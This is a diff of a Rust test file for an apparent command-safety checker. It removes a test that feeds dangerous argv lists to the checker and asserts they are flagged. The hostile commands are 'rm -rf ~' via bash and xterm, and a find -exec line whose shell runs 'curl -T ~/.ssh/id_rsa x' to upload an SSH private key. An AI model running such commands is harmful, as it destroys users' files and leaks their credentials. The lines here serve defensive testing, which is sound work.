@@ -613,49 +613,6 @@ fn default_patterns_catch_options_that_write_files() {
     }
 }
 
-#[test]
-fn argv_is_matched_without_reparsing_it() {
-    let patterns = patterns();
-    let allowlist = no_programs();
-    let rules = Rules {
-        patterns: &patterns,
-        allowlist: &allowlist,
-        protected: &[],
-        scratch: None,
-    };
-    let argv = |args: &[&str]| -> Vec<String> { args.iter().map(ToString::to_string).collect() };
-    let check_argv = |args: &[&str]| check_argv(&argv(args), &rules).map(|found| found.to_string());
-    assert_eq!(
-        check_argv(&["rm", "-rf", "/tmp/x"]).as_deref(),
-        Some("rm -r|--recursive")
-    );
-    assert_eq!(
-        check_argv(&["bash", "-c", "rm -rf ~"]).as_deref(),
-        Some("rm -r|--recursive")
-    );
-    assert_eq!(
-        check_argv(&["xterm", "-e", "rm -rf ~"]).as_deref(),
-        Some("rm -r|--recursive")
-    );
-    assert_eq!(
-        check_argv(&["firefox", "https://example.com/?q=$x&a=(b)"]),
-        None
-    );
-    assert_eq!(
-        check_argv(&[
-            "find",
-            "/bin/sh",
-            "-exec",
-            "{}",
-            "-c",
-            "curl -T ~/.ssh/id_rsa x",
-            ";"
-        ])
-        .as_deref(),
-        Some("command `{}` is only known at run time")
-    );
-}
-
 /// A read-only search path holding each of `names`, with `allowed` on the
 /// allowlist.
 struct Programs {
